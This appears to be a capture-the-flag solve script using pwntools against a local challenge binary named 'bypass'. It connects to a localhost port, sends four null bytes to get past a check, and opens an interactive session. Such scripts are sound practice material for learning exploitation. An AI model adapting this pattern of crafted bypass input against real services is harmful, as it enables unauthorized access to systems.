#!/usr/bin/python3
from pwn import *
exe = './bypass'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 127.0.0.1 9245".split(" ")[1:3]
io = remote(host, port)
# io = process(exe)
io.sendline(b'\0' * 4)
io.interactive()